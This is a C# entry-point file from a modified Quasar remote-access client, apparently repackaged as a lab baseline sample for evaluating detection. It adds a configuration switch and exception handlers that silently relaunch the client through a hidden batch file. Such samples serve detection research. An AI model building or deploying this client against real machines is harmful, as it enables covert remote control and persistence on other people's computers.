// ---------------------------------------------------------------------------
// Quasar 检测评估实验台 · 实验室基线样本（Quasar-LabBaseline）
// 作者：陈森（Chen Sen）  https://github.com/chendashi666
// 本文件由陈森创作或改造：禁止盗卖，禁止商业用途。
// 上游 Quasar 代码版权归 MaxXor 及 Quasar 贡献者所有（MIT License）。
// ---------------------------------------------------------------------------

using Quasar.Client.Forms;
using Quasar.Client.IO;
using Quasar.Common.Properties;
using System;
using System.Diagnostics;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client
{
    internal static class Program
    {
        /// <summary>
        /// Command line switch which opens the laboratory configuration form and exits without
        /// starting the client. Example: <c>LabBaseline.exe --config</c>
        /// </summary>
        private const string ConfigSwitch = "--config";

        [STAThread]
        private static void Main(string[] args)
        {
            // enable TLS 1.2
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            // Laboratory baseline: parameter administration runs before any client logic.
            if (IsLabConfigRequest(args))
            {
                ShowLabConfiguration();
                return;
            }

            // Set the unhandled exception mode to force all Windows Forms errors to go through our handler
            Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);

            // Add the event handler for handling UI thread exceptions
            Application.ThreadException += HandleThreadException;

            // Add the event handler for handling non-UI thread exceptions
            AppDomain.CurrentDomain.UnhandledException += HandleUnhandledException;

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new QuasarApplication());
        }

        /// <summary>
        /// Determines whether the process was started purely to edit the external configuration.
        /// </summary>
        private static bool IsLabConfigRequest(string[] args)
        {
            if (args == null)
                return false;

            foreach (var arg in args)
            {
                if (string.Equals(arg, ConfigSwitch, StringComparison.OrdinalIgnoreCase) ||
                    string.Equals(arg, "-config", StringComparison.OrdinalIgnoreCase))
                    return true;
            }

            return false;
        }

        /// <summary>
        /// Opens the laboratory configuration form. Nothing else of the client is started.
        /// </summary>
        private static void ShowLabConfiguration()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new FrmLabConfig());
        }

        private static void HandleThreadException(object sender, ThreadExceptionEventArgs e)
        {
            Debug.WriteLine(LabStrings.LogMarker + " UI thread exception: " + e);
            try
            {
                string batchFile = BatchFile.CreateRestartBatch(Application.ExecutablePath);

                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    FileName = batchFile
                };
                Process.Start(startInfo);
            }
            catch (Exception exception)
            {
                Debug.WriteLine(exception);
            }
            finally
            {
                Environment.Exit(0);
            }
        }

        /// <summary>
        /// Handles unhandled exceptions by restarting the application and hoping that they don't happen again.
        /// </summary>
        /// <param name="sender">The source of the unhandled exception event.</param>
        /// <param name="e">The event arguments. </param>
        private static void HandleUnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            if (e.IsTerminating)
            {
                Debug.WriteLine(LabStrings.LogMarker + " non-UI thread exception: " + e);
                try
                {
                    string batchFile = BatchFile.CreateRestartBatch(Application.ExecutablePath);

                    ProcessStartInfo startInfo = new ProcessStartInfo
                    {
                        WindowStyle = ProcessWindowStyle.Hidden,
                        UseShellExecute = true,
                        FileName = batchFile
                    };
                    Process.Start(startInfo);
                }
                catch (Exception exception)
                {
                    Debug.WriteLine(exception);
                }
                finally
                {
                    Environment.Exit(0);
                }
            }
        }
    }
}
